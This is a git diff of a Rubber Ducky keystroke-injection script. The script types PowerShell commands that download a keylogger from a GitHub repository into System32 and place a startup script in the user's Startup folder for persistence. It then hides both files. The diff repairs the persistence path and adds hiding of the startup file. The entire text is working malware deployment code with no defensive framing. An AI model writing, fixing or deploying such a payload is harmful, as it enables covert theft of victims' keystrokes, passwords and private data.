@@ -25,6 +25,12 @@ DELAY 200
 STRING $dest = "C:\Windows\System32\dll.py"
 ENTER
 DELAY 200
+STRING $username = $env:UserName
+ENTER
+DELAY 200
+STRING $filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bootup.cmd'
+ENTER
+DELAY 200
 STRING $bol1 = Test-Path -Path $dest
 ENTER
 DELAY 200
@@ -40,10 +46,13 @@ DELAY 200
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile $dest
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -OutFile 'C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+STRING Invoke-WebRequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -OutFile $filedest
 ENTER
 DELAY 200
 STRING $HIDE=Get-Item $dest -Force
+ENTER
+DELAY 200
+STRING $HIDE=Get-Item $filedest -Force
 ENTER
 DELAY 200
 STRING $HIDE.Attributes="Hidden"
